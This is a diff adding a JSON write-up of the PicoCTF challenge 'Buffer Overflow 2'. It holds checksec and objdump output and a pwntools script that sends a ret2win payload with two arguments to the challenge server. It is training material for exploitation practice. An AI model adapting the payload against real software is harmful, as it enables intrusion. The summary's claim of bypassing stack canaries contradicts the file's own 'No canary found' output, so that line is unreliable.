@@ -1,0 +1,55 @@
+{
+  "id": "ctf-picoctf-buffer-overflow",
+  "title": "PicoCTF: Buffer Overflow 2",
+  "slug": "picoctf-buffer-overflow-2",
+  "category": "ctf",
+  "tags": [
+    "PicoCTF",
+    "Binary Exploitation",
+    "Buffer Overflow",
+    "x86"
+  ],
+  "difficulty": "Medium",
+  "date": "2024-10-20",
+  "summary": "Classic stack-based buffer overflow with ret2win technique, bypassing stack canaries on x86 architecture.",
+  "platform": "PicoCTF",
+  "content": [
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Binary Analysis"
+    },
+    {
+      "type": "paragraph",
+      "text": "First, let's analyze the binary protections and identify the vulnerability."
+    },
+    {
+      "type": "code",
+      "language": "bash",
+      "code": "checksec --file=vuln\n# RELRO:    Partial RELRO\n# Stack:    No canary found\n# NX:       NX enabled\n# PIE:      No PIE"
+    },
+    {
+      "type": "paragraph",
+      "text": "No canary and no PIE makes this straightforward. Let's find the win function address."
+    },
+    {
+      "type": "code",
+      "language": "bash",
+      "code": "objdump -d vuln | grep win\n# 080491f2 <win>:"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Exploit Development"
+    },
+    {
+      "type": "code",
+      "language": "python",
+      "code": "from pwn import *\n\n# Connect to target\np = remote('saturn.picoctf.net', 52574)\n\n# Build payload\noffset = 112\nwin_addr = 0x080491f2\narg1 = 0xCAFEF00D\narg2 = 0xF00DF00D\n\npayload = b'A' * offset\npayload += p32(win_addr)\npayload += p32(0xdeadbeef)  # fake return\npayload += p32(arg1)\npayload += p32(arg2)\n\np.sendline(payload)\np.interactive()"
+    },
+    {
+      "type": "flag",
+      "text": "picoCTF{argum3nt5_4_d4yZ_...}"
+    }
+  ]
+}
